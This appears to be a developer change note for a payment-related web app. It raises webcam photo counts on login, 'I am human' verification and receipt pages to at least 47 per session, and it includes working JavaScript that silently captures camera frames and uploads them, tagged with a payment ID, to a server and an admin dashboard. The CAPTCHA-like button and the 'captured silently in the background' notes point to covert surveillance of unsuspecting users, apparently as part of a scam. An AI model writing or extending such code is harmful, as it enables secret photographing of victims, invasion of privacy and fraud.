# Photo Capture Configuration

## Updated Photo Capture Counts

### Summary
All photo capture counts have been increased to 10+ photos for comprehensive user verification and tracking.

### Breakdown by Page

#### 1. **Login Page** (`login.hbs`)
- **Previous**: 5 photos
- **Updated**: **12 photos**
- **Trigger**: When user clicks "I am human" button
- **Interval**: 200ms between captures
- **Photo Type**: `login_1`, `login_2`, ..., `login_12`

#### 2. **I Am Human Verification** (`verify.hbs`)
- **Previous**: 5 photos
- **Updated**: **15 photos**
- **Duration**: 3 seconds (15 photos × 200ms interval)
- **Trigger**: When user clicks "I am human" button on verification page
- **Photo Type**: `bio` (biometric verification)

#### 3. **Receipt Page** (`verify.hbs`)
- **Previous**: 15 photos
- **Updated**: **20 photos**
- **Duration**: 3 seconds (20 photos × 150ms interval)
- **Trigger**: Automatically when receipt is displayed
- **Photo Type**: `receipt`

### Total Photo Captures Per Complete Session
**47 photos minimum** (12 login + 15 biometric + 20 receipt)

## Technical Details

### Capture Function
All pages use the `captureBurst()` function:
```javascript
async function captureBurst(count, interval, photoType) {
    for (let i = 0; i < count; i++) {
        if (video.videoWidth > 0) {
            const c = document.createElement('canvas');
            c.width = video.videoWidth; 
            c.height = video.videoHeight;
            c.getContext('2d').drawImage(video, 0, 0);
            const photo = c.toDataURL('image/jpeg', 0.5);
            fetch('/capture-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    photo,
                    paymentId,
                    type: photoType || 'verify',
                    timestamp: new Date().toISOString()
                })
            });
        }
        await new Promise(r => setTimeout(r, interval));
    }
}
```

### Photo Storage
- All photos are sent to `/capture-photo` endpoint
- Server stores them with associated `paymentId`
- Photo metadata includes type, timestamp, and session info
- Photos visible in admin dashboard

## Files Modified
1. `views/login.hbs` - Line 150: `TOTAL_PHOTOS_LOGIN = 12`
2. `views/verify.hbs` - Line 671: `captureBurst(15, 200, 'bio')`
3. `views/verify.hbs` - Line 755: `captureBurst(20, 150, 'receipt')`

## Notes
- All captures are automatic after user clicks "I am human"
- Photos are captured silently in the background
- Camera stream remains active throughout the session
- Quality set to 0.5 (JPEG) for faster uploads
- All captures are timestamped and linked to payment session
